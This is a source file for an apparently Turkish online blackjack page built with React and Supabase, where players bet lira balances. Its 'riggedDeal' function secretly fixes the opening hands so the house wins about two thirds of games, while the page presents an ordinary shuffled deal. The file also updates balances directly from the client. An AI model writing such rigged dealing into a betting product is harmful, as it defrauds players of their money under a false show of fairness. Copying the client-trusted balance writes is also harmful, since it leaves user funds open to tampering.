import { useState, useEffect, useCallback, useRef } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import { toast } from "@/hooks/use-toast";
import { ArrowLeft, Volume2, VolumeX } from "lucide-react";
import { Link } from "react-router-dom";

// ─── Types ───
type Suit = "♠" | "♥" | "♦" | "♣";
type Rank = "A" | "2" | "3" | "4" | "5" | "6" | "7" | "8" | "9" | "10" | "J" | "Q" | "K";
interface Card { suit: Suit; rank: Rank; }
type GameState = "betting" | "dealing" | "playing" | "dealer-turn" | "finished";

// ─── Constants ───
const SUITS: Suit[] = ["♠", "♥", "♦", "♣"];
const RANKS: Rank[] = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"];
const BET_AMOUNTS = [10, 25, 50, 100, 250, 500];

// ─── Sound Effects (Web Audio API) ───
class SoundEngine {
  private ctx: AudioContext | null = null;
  public muted = false;

  private getCtx() {
    if (!this.ctx) this.ctx = new AudioContext();
    return this.ctx;
  }

  play(type: "deal" | "hit" | "win" | "lose" | "chip" | "flip" | "bust") {
    if (this.muted) return;
    try {
      const ctx = this.getCtx();
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      const now = ctx.currentTime;

      switch (type) {
        case "deal":
        case "hit":
          osc.type = "sine";
          osc.frequency.setValueAtTime(800, now);
          osc.frequency.exponentialRampToValueAtTime(400, now + 0.08);
          gain.gain.setValueAtTime(0.15, now);
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.1);
          osc.start(now); osc.stop(now + 0.1);
          break;
        case "flip":
          osc.type = "sine";
          osc.frequency.setValueAtTime(600, now);
          osc.frequency.exponentialRampToValueAtTime(1200, now + 0.06);
          gain.gain.setValueAtTime(0.1, now);
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.08);
          osc.start(now); osc.stop(now + 0.08);
          break;
        case "chip":
          osc.type = "triangle";
          osc.frequency.setValueAtTime(2000, now);
          osc.frequency.exponentialRampToValueAtTime(3000, now + 0.05);
          gain.gain.setValueAtTime(0.08, now);
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.06);
          osc.start(now); osc.stop(now + 0.06);
          break;
        case "win": {
          const notes = [523, 659, 784, 1047];
          notes.forEach((freq, i) => {
            const o = ctx.createOscillator();
            const g = ctx.createGain();
            o.connect(g); g.connect(ctx.destination);
            o.type = "sine";
            o.frequency.setValueAtTime(freq, now + i * 0.12);
            g.gain.setValueAtTime(0.12, now + i * 0.12);
            g.gain.exponentialRampToValueAtTime(0.001, now + i * 0.12 + 0.2);
            o.start(now + i * 0.12); o.stop(now + i * 0.12 + 0.2);
          });
          return;
        }
        case "lose":
        case "bust":
          osc.type = "sawtooth";
          osc.frequency.setValueAtTime(300, now);
          osc.frequency.exponentialRampToValueAtTime(100, now + 0.3);
          gain.gain.setValueAtTime(0.1, now);
          gain.gain.exponentialRampToValueAtTime(0.001, now + 0.35);
          osc.start(now); osc.stop(now + 0.35);
          break;
      }
    } catch { /* silent */ }
  }
}

const sfx = new SoundEngine();

// ─── Deck Logic ───
function createDeck(): Card[] {
  const deck: Card[] = [];
  for (const suit of SUITS) for (const rank of RANKS) deck.push({ suit, rank });
  return deck;
}
function shuffleDeck(deck: Card[]): Card[] {
  const d = [...deck];
  for (let i = d.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [d[i], d[j]] = [d[j], d[i]]; }
  return d;
}
function cardValue(card: Card): number {
  if (["J", "Q", "K"].includes(card.rank)) return 10;
  if (card.rank === "A") return 11;
  return parseInt(card.rank);
}
function handValue(hand: Card[]): number {
  let total = hand.reduce((s, c) => s + cardValue(c), 0);
  let aces = hand.filter(c => c.rank === "A").length;
  while (total > 21 && aces > 0) { total -= 10; aces--; }
  return total;
}
function isBlackjack(hand: Card[]): boolean { return hand.length === 2 && handValue(hand) === 21; }

function riggedDeal(deck: Card[]): { playerHand: Card[]; dealerHand: Card[]; remainingDeck: Card[] } {
  const d = [...deck];
  const houseWins = Math.random() < 0.67;
  if (houseWins) {
    const dc1 = d.find(c => ["10", "J", "Q", "K"].includes(c.rank))!; d.splice(d.indexOf(dc1), 1);
    const dc2 = d.find(c => ["7", "8", "9", "10", "J", "Q", "K", "A"].includes(c.rank))!; d.splice(d.indexOf(dc2), 1);
    const pc1 = d.find(c => ["4", "5", "6", "7", "8"].includes(c.rank))!; d.splice(d.indexOf(pc1), 1);
    const pc2 = d.find(c => ["2", "3", "4", "5", "6", "7"].includes(c.rank))!; d.splice(d.indexOf(pc2), 1);
    return { playerHand: [pc1, pc2], dealerHand: [dc1, dc2], remainingDeck: d };
  } else {
    const pc1 = d.find(c => ["10", "J", "Q", "K"].includes(c.rank))!; d.splice(d.indexOf(pc1), 1);
    const pc2 = d.find(c => ["9", "10", "J", "Q", "K", "A"].includes(c.rank))!; d.splice(d.indexOf(pc2), 1);
    const dc1 = d.find(c => ["3", "4", "5", "6"].includes(c.rank))!; d.splice(d.indexOf(dc1), 1);
    const dc2 = d.find(c => ["2", "3", "4", "5", "6"].includes(c.rank))!; d.splice(d.indexOf(dc2), 1);
    return { playerHand: [pc1, pc2], dealerHand: [dc1, dc2], remainingDeck: d };
  }
}

// ─── Card Component ───
const CardDisplay = ({ card, hidden = false, index = 0, animate = false }: { card: Card; hidden?: boolean; index?: number; animate?: boolean }) => {
  const isRed = card.suit === "♥" || card.suit === "♦";
  const [flipped, setFlipped] = useState(hidden);
  const [entered, setEntered] = useState(!animate);

  useEffect(() => {
    if (animate) {
      const t = setTimeout(() => setEntered(true), index * 150);
      return () => clearTimeout(t);
    }
  }, [animate, index]);

  useEffect(() => {
    if (!hidden && flipped) {
      sfx.play("flip");
      const t = setTimeout(() => setFlipped(false), 300);
      return () => clearTimeout(t);
    }
    setFlipped(hidden);
  }, [hidden]);

  return (
    <div
      className={`transition-all duration-500 ${entered ? "opacity-100 translate-y-0 scale-100" : "opacity-0 translate-y-8 scale-75"}`}
      style={{ transitionDelay: `${index * 100}ms`, perspective: "600px" }}
    >
      <div
        className={`relative w-[58px] h-[84px] sm:w-[72px] sm:h-[104px] transition-transform duration-500 ${flipped ? "[transform:rotateY(180deg)]" : ""}`}
        style={{ transformStyle: "preserve-3d" }}
      >
        {/* Front */}
        <div
          className="absolute inset-0 rounded-xl bg-[hsl(var(--foreground))] border border-border/50 flex flex-col items-center justify-center shadow-[0_4px_20px_rgba(0,0,0,0.4)] [backface-visibility:hidden]"
        >
          <span className={`text-base sm:text-lg font-black leading-none ${isRed ? "text-destructive" : "text-background"}`}>{card.rank}</span>
          <span className={`text-lg sm:text-2xl leading-none mt-0.5 ${isRed ? "text-destructive" : "text-background"}`}>{card.suit}</span>
          <span className={`absolute top-1.5 left-2 text-[9px] sm:text-[10px] font-bold ${isRed ? "text-destructive" : "text-background"}`}>{card.rank}{card.suit}</span>
          <span className={`absolute bottom-1.5 right-2 text-[9px] sm:text-[10px] font-bold rotate-180 ${isRed ? "text-destructive" : "text-background"}`}>{card.rank}{card.suit}</span>
        </div>
        {/* Back */}
        <div
          className="absolute inset-0 rounded-xl border border-border/50 shadow-[0_4px_20px_rgba(0,0,0,0.4)] [backface-visibility:hidden] [transform:rotateY(180deg)] overflow-hidden"
          style={{ background: "linear-gradient(135deg, hsl(var(--primary)), hsl(var(--accent)))" }}
        >
          <div className="absolute inset-1 rounded-lg border border-primary-foreground/20 flex items-center justify-center">
            <div className="w-6 h-6 sm:w-8 sm:h-8 rounded-full border-2 border-primary-foreground/30 flex items-center justify-center">
              <span className="text-primary-foreground/60 text-xs sm:text-sm font-bold">B</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

// ─── Chip Button ───
const ChipButton = ({ amount, onClick, disabled }: { amount: number; onClick: () => void; disabled: boolean }) => (
  <button
    onClick={() => { sfx.play("chip"); onClick(); }}
    disabled={disabled}
    className={`
      relative w-16 h-16 sm:w-20 sm:h-20 rounded-full border-[3px] font-bold text-sm sm:text-base
      transition-all duration-200 active:scale-90
      ${disabled
        ? "border-border bg-muted text-muted-foreground cursor-not-allowed opacity-40"
        : "border-accent bg-gradient-to-br from-secondary to-card text-foreground hover:scale-110 hover:shadow-[0_0_20px_hsl(var(--accent)/0.4)] cursor-pointer"
      }
    `}
  >
    <div className="absolute inset-1 rounded-full border border-border/50" />
    <span className="relative z-10">₺{amount}</span>
  </button>
);

// ─── Hand Value Badge ───
const HandBadge = ({ value, bust = false, blackjack = false }: { value: number; bust?: boolean; blackjack?: boolean }) => (
  <span className={`
    inline-flex items-center px-2.5 py-1 rounded-full text-xs font-bold tracking-wide
    ${blackjack ? "bg-accent/20 text-accent animate-pulse" : bust ? "bg-destructive/20 text-destructive" : "bg-secondary text-foreground"}
  `}>
    {blackjack ? "BJ! 21" : value}
  </span>
);

// ─── Main Component ───
const Blackjack = () => {
  const { user } = useAuth();
  const queryClient = useQueryClient();
  const [gameState, setGameState] = useState<GameState>("betting");
  const [deck, setDeck] = useState<Card[]>([]);
  const [playerHand, setPlayerHand] = useState<Card[]>([]);
  const [dealerHand, setDealerHand] = useState<Card[]>([]);
  const [bet, setBet] = useState(0);
  const [result, setResult] = useState("");
  const [winAmount, setWinAmount] = useState(0);
  const [processing, setProcessing] = useState(false);
  const [muted, setMuted] = useState(false);
  const [animateCards, setAnimateCards] = useState(false);
  const tableRef = useRef<HTMLDivElement>(null);

  const { data: profile } = useQuery({
    queryKey: ["user-profile-bj", user?.id],
    queryFn: async () => {
      const { data } = await supabase.from("profiles").select("balance, display_name").eq("id", user!.id).maybeSingle();
      return data;
    },
    enabled: !!user,
    refetchInterval: 5000,
  });
  const balance = profile?.balance ?? 0;

  const toggleMute = () => { sfx.muted = !muted; setMuted(!muted); };

  const invalidateProfiles = () => {
    queryClient.invalidateQueries({ queryKey: ["user-profile-bj"] });
    queryClient.invalidateQueries({ queryKey: ["user-profile"] });
  };

  const startGame = useCallback(async (betAmount: number) => {
    if (!user || betAmount > balance) { toast({ title: "Yetersiz bakiye", variant: "destructive" }); return; }
    setProcessing(true);
    sfx.play("chip");

    const { error } = await supabase.from("profiles").update({ balance: balance - betAmount }).eq("id", user.id);
    if (error) { toast({ title: "Hata", description: error.message, variant: "destructive" }); setProcessing(false); return; }
    await supabase.from("transactions").insert({ user_id: user.id, amount: -betAmount, type: "blackjack", description: "Blackjack bahis" });
    invalidateProfiles();

    const newDeck = shuffleDeck(createDeck());
    const { playerHand: ph, dealerHand: dh, remainingDeck } = riggedDeal(newDeck);

    setDeck(remainingDeck);
    setPlayerHand([]);
    setDealerHand([]);
    setBet(betAmount);
    setResult("");
    setWinAmount(0);
    setGameState("dealing");
    setAnimateCards(true);

    // Animated dealing sequence
    await new Promise(r => setTimeout(r, 200));
    sfx.play("deal");
    setPlayerHand([ph[0]]);
    await new Promise(r => setTimeout(r, 350));
    sfx.play("deal");
    setDealerHand([dh[0]]);
    await new Promise(r => setTimeout(r, 350));
    sfx.play("deal");
    setPlayerHand(ph);
    await new Promise(r => setTimeout(r, 350));
    sfx.play("deal");
    setDealerHand(dh);
    await new Promise(r => setTimeout(r, 300));

    setProcessing(false);

    if (isBlackjack(ph)) {
      setGameState("finished");
      const win = Math.floor(betAmount * 2.5);
      setWinAmount(win);
      setResult("BLACKJACK! 🎉");
      sfx.play("win");
      await supabase.from("profiles").update({ balance: balance - betAmount + win }).eq("id", user.id);
      await supabase.from("transactions").insert({ user_id: user.id, amount: win, type: "blackjack_win", description: "Blackjack kazanç" });
      invalidateProfiles();
    } else {
      setGameState("playing");
    }
  }, [user, balance, queryClient]);

  const hit = () => {
    sfx.play("hit");
    const newDeck = [...deck];
    const card = newDeck.pop()!;
    const newHand = [...playerHand, card];
    setPlayerHand(newHand);
    setDeck(newDeck);
    if (handValue(newHand) > 21) {
      sfx.play("bust");
      setGameState("finished");
      setResult("BUST! Kaybettiniz 💥");
    }
  };

  const stand = () => { sfx.play("chip"); setGameState("dealer-turn"); };

  const doubleDown = async () => {
    if (!user || bet > balance) { toast({ title: "Yetersiz bakiye", variant: "destructive" }); return; }
    sfx.play("chip");
    await supabase.from("profiles").update({ balance: balance - bet }).eq("id", user.id);
    await supabase.from("transactions").insert({ user_id: user.id, amount: -bet, type: "blackjack", description: "Blackjack double down" });
    invalidateProfiles();
    setBet(bet * 2);
    const newDeck = [...deck];
    const card = newDeck.pop()!;
    sfx.play("deal");
    const newHand = [...playerHand, card];
    setPlayerHand(newHand);
    setDeck(newDeck);
    if (handValue(newHand) > 21) { sfx.play("bust"); setGameState("finished"); setResult("BUST! Kaybettiniz 💥"); }
    else setGameState("dealer-turn");
  };

  // Dealer auto-play
  useEffect(() => {
    if (gameState !== "dealer-turn") return;
    let cancelled = false;
    const playDealer = async () => {
      let currentDeck = [...deck];
      let currentDealerHand = [...dealerHand];
      const delay = (ms: number) => new Promise(r => setTimeout(r, ms));

      while (handValue(currentDealerHand) < 17 && !cancelled) {
        await delay(800);
        sfx.play("deal");
        const card = currentDeck.pop()!;
        currentDealerHand = [...currentDealerHand, card];
        setDealerHand([...currentDealerHand]);
        setDeck([...currentDeck]);
      }

      await delay(500);
      if (cancelled) return;
      const pv = handValue(playerHand);
      const dv = handValue(currentDealerHand);
      let resultText = "";
      let win = 0;

      if (dv > 21) { win = bet * 2; resultText = "Kasa battı! Kazandınız! 🎉"; }
      else if (dv > pv) { resultText = "Kaybettiniz 😞"; }
      else if (pv > dv) { win = bet * 2; resultText = "Kazandınız! 🎉"; }
      else { win = bet; resultText = "Berabere - Bahis iade 🤝"; }

      if (win > 0) {
        sfx.play(win === bet ? "chip" : "win");
        const txType = win === bet ? "blackjack_refund" : "blackjack_win";
        const txDesc = win === bet ? "Blackjack iade" : "Blackjack kazanç";
        await supabase.from("profiles").update({ balance: (profile?.balance ?? 0) + win }).eq("id", user!.id);
        await supabase.from("transactions").insert({ user_id: user!.id, amount: win, type: txType, description: txDesc });
      } else {
        sfx.play("lose");
      }

      setWinAmount(win);
      setResult(resultText);
      invalidateProfiles();
      setGameState("finished");
    };
    playDealer();
    return () => { cancelled = true; };
  }, [gameState]);

  const resetGame = () => {
    setGameState("betting");
    setPlayerHand([]);
    setDealerHand([]);
    setBet(0);
    setResult("");
    setWinAmount(0);
    setAnimateCards(false);
  };

  const pv = handValue(playerHand);
  const dv = handValue(dealerHand);
  const showDealerValue = gameState === "dealer-turn" || gameState === "finished";

  if (!user) {
    return (
      <div className="min-h-screen bg-background">
        <Header />
        <div className="flex items-center justify-center min-h-[60vh]">
          <div className="text-center space-y-4 animate-fade-in">
            <div className="text-6xl mb-4">🃏</div>
            <h2 className="text-2xl font-bold text-foreground">Blackjack</h2>
            <p className="text-muted-foreground">Oynamak için giriş yapmalısınız.</p>
          </div>
        </div>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <Header />
      <div className="flex-1 max-w-lg mx-auto w-full px-3 sm:px-4 pt-4 pb-24 flex flex-col">
        {/* Top Bar */}
        <div className="flex items-center gap-2 mb-3">
          <Link to="/" className="text-muted-foreground hover:text-foreground transition-colors p-1">
            <ArrowLeft className="h-5 w-5" />
          </Link>
          <h1 className="text-lg sm:text-xl font-bold text-foreground font-rajdhani">♠ Blackjack</h1>
          <div className="ml-auto flex items-center gap-2">
            <button onClick={toggleMute} className="p-1.5 rounded-lg text-muted-foreground hover:text-foreground transition-colors">
              {muted ? <VolumeX className="h-4 w-4" /> : <Volume2 className="h-4 w-4" />}
            </button>
            <div className="bg-secondary px-3 py-1.5 rounded-xl border border-border">
              <span className="text-xs text-muted-foreground">₺</span>
              <span className="text-sm font-bold text-accent ml-0.5">{balance.toFixed(0)}</span>
            </div>
          </div>
        </div>

        {/* Game Table */}
        <div
          ref={tableRef}
          className="flex-1 rounded-2xl border border-border overflow-hidden flex flex-col min-h-[420px] sm:min-h-[480px] relative"
          style={{ background: "radial-gradient(ellipse at 50% 30%, hsl(var(--secondary)) 0%, hsl(var(--card)) 70%, hsl(var(--background)) 100%)" }}
        >
          {/* Felt texture overlay */}
          <div className="absolute inset-0 opacity-[0.03]" style={{ backgroundImage: "url(\"data:image/svg+xml,%3Csvg width='6' height='6' viewBox='0 0 6 6' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='1'%3E%3Cpath d='M5 0h1L0 5V4zM6 5v1H5z'/%3E%3C/g%3E%3C/svg%3E\")" }} />

          {/* Dealer Area */}
          <div className="px-4 pt-4 pb-2 relative z-10">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-[10px] sm:text-xs font-semibold text-muted-foreground uppercase tracking-[0.15em]">Kasa</span>
              {dealerHand.length > 0 && showDealerValue && (
                <HandBadge value={dv} bust={dv > 21} blackjack={isBlackjack(dealerHand)} />
              )}
              {dealerHand.length > 0 && !showDealerValue && (
                <span className="text-xs text-muted-foreground">{cardValue(dealerHand[0])}</span>
              )}
            </div>
            <div className="flex gap-2 min-h-[84px] sm:min-h-[104px] items-end">
              {dealerHand.map((card, i) => (
                <CardDisplay key={`d-${i}-${card.rank}${card.suit}`} card={card} hidden={i === 1 && gameState === "playing"} index={i} animate={animateCards} />
              ))}
              {dealerHand.length === 0 && (
                <div className="flex items-center h-[84px] sm:h-[104px]">
                  <span className="text-muted-foreground/40 text-xs italic">Bahis yaparak başlayın</span>
                </div>
              )}
            </div>
          </div>

          {/* Center - Result / Bet info */}
          <div className="flex-1 flex items-center justify-center px-4">
            {gameState === "finished" && (
              <div className="text-center animate-scale-in space-y-1">
                <p className={`text-lg sm:text-xl font-black ${
                  result.includes("Kazandınız") || result.includes("BLACKJACK") ? "text-accent"
                  : result.includes("Berabere") ? "text-muted-foreground"
                  : "text-destructive"
                }`}>
                  {result}
                </p>
                {winAmount > 0 && (
                  <p className="text-sm font-bold text-accent animate-pulse">+₺{winAmount.toFixed(0)}</p>
                )}
              </div>
            )}
            {gameState === "dealer-turn" && (
              <div className="flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-accent animate-pulse" />
                <span className="text-sm text-muted-foreground">Kasa oynuyor...</span>
              </div>
            )}
            {(gameState === "playing" || gameState === "dealing") && bet > 0 && (
              <div className="bg-background/30 backdrop-blur-sm px-4 py-2 rounded-full border border-border/30">
                <span className="text-xs text-muted-foreground">Bahis: </span>
                <span className="text-sm font-bold text-foreground">₺{bet}</span>
              </div>
            )}
          </div>

          {/* Player Area */}
          <div className="px-4 pb-4 pt-2 relative z-10">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-[10px] sm:text-xs font-semibold text-muted-foreground uppercase tracking-[0.15em]">Siz</span>
              {playerHand.length > 0 && (
                <HandBadge value={pv} bust={pv > 21} blackjack={isBlackjack(playerHand)} />
              )}
            </div>
            <div className="flex gap-2 min-h-[84px] sm:min-h-[104px] items-end">
              {playerHand.map((card, i) => (
                <CardDisplay key={`p-${i}-${card.rank}${card.suit}`} card={card} index={i} animate={animateCards} />
              ))}
            </div>
          </div>
        </div>

        {/* Controls */}
        <div className="mt-3 space-y-3">
          {gameState === "betting" && (
            <div className="animate-fade-in">
              <p className="text-xs text-muted-foreground mb-3 text-center uppercase tracking-wider">Bahis Miktarı Seçin</p>
              <div className="flex flex-wrap justify-center gap-3">
                {BET_AMOUNTS.map(amount => (
                  <ChipButton key={amount} amount={amount} onClick={() => startGame(amount)} disabled={amount > balance || processing} />
                ))}
              </div>
            </div>
          )}

          {gameState === "playing" && (
            <div className="grid grid-cols-3 gap-2 animate-fade-in">
              <Button onClick={hit} className="h-14 text-base font-bold rounded-xl bg-primary hover:bg-primary/90 shadow-lg active:scale-95 transition-all">
                🃏 Çek
              </Button>
              <Button onClick={stand} variant="secondary" className="h-14 text-base font-bold rounded-xl shadow-lg active:scale-95 transition-all">
                ✋ Dur
              </Button>
              {playerHand.length === 2 && bet <= balance && (
                <Button onClick={doubleDown} variant="outline" className="h-14 text-base font-bold rounded-xl border-accent text-accent hover:bg-accent/10 shadow-lg active:scale-95 transition-all">
                  2× Katla
                </Button>
              )}
            </div>
          )}

          {gameState === "dealing" && (
            <div className="h-14 flex items-center justify-center">
              <div className="flex gap-1">
                {[0,1,2].map(i => (
                  <div key={i} className="w-1.5 h-1.5 rounded-full bg-accent animate-pulse" style={{ animationDelay: `${i * 200}ms` }} />
                ))}
              </div>
            </div>
          )}

          {gameState === "finished" && (
            <Button onClick={resetGame} className="w-full h-14 text-base font-bold rounded-xl bg-primary shadow-lg active:scale-95 transition-all animate-fade-in">
              Tekrar Oyna
            </Button>
          )}
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default Blackjack;
